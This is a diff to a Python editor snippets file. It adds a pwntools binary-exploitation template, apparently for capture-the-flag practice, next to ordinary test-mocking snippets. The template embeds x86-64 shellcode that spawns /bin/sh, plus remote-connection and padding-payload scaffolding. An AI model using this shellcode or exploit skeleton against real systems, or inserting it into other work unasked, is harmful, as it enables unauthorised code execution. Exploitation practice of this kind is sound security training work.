@@ -2,9 +2,37 @@
 snippet ret_response Return response if the check failed
 	if isinstance($1, Response): return $1$0
 
-snippet mock_fn_retval Mock a function and 
+snippet mock_fn_retval Mock a function and
 
 	mocked_$1 = MagicMock()
 	monkeypatch.setattr('app.$2 $1', mocked_$1)
 	mocked_$1.return_value = $3
 	$0
+
+snippet pwn_base Base script for binary exploitation using pwntools
+
+	from pwn import *
+
+	context.terminal = ["ghostty", "-e"]
+	shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+
+	BINARY_PATH = "$1"
+	COMMANDS = """
+	c
+	"""
+
+	our_bin = ELF(BINARY_PATH)
+
+	if args.REMOTE:
+	    c = remote("", 8080, ssl=True)
+	else:
+	    if args.GDB:
+	        c = gdb.debug(BINARY_PATH, gdbscript=COMMANDS)
+	    else:
+	        c = process(BINARY_PATH)
+
+	payload = b"A" * 0x10
+
+	c.send(payload)
+
+	c.interactive()
